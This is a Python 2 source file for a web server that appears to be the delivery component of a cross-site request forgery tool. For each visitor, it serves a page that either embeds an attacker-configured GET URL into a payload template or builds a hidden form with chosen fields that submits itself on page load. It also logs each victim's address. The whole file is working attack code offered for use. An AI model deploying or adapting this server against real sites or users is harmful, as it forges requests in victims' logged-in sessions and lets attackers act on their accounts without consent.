from BaseHTTPServer import HTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler
import sys
import random

global_url = global_parameters = global_method = global_payload = ''

class HTTPHandler (SimpleHTTPRequestHandler):
	server_version = "LibHttpWSF/1.0"

	def do_GET(self):
		print "[+] New connection: %s:%d" % (self.client_address[0], self.client_address[1])
		self.index()

	def prepare_request(self, csrf_name):
		global global_url
		global global_parameters
		global global_method
		global global_payload
		if global_method.lower() == "get":
			global_url += "?"
			for key, value in global_parameters.items():
				global_url += key + "=" + value + "&"
			global_payload = global_payload.replace("[EXPLOIT]", global_url)
			return global_payload
		elif global_method.lower() == "post":
			result = "<form id='"+csrf_name+"' action='"+global_url+"' method='post'>"
			for key, value in global_parameters.items():
				result += "<input type='hidden' name='"+key+"' value='"+value+"'>"
			result += "</form>"
			return result

	def index(self):
		global global_method
		if global_method.lower() == "get":
			html_response = '<html><head></head><body>'+self.prepare_request('')+'</body></html>'
		else:
			csrf_name = ''.join(random.choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(36))
			html_response = '<html><head></head><body onload="document.getElementById(\''+csrf_name+'\').submit()">'+self.prepare_request(csrf_name)+'</body></html>'
		self.send_response(200)
		self.send_header("Content-type", "text/html")
		self.send_header("Content-length", len(html_response))
		self.end_headers()
		self.wfile.write(html_response)
		return SimpleHTTPRequestHandler.do_GET(self)

class WebServer:
	"""
	Initialise un serveur web sur le port 8080
	"""
	def __init__(self, port, url, parameters, method, payload):
		global global_url
		global global_parameters
		global global_method
		global global_payload
		global_url = url
		global_parameters = parameters
		global_method = method
		global_payload = payload
		self.port = port
		print("The web server is started on port %i" % self.port)
		self.initialize()

	def initialize(self):
		server = HTTPServer(("",self.port), HTTPHandler)
		server.serve_forever()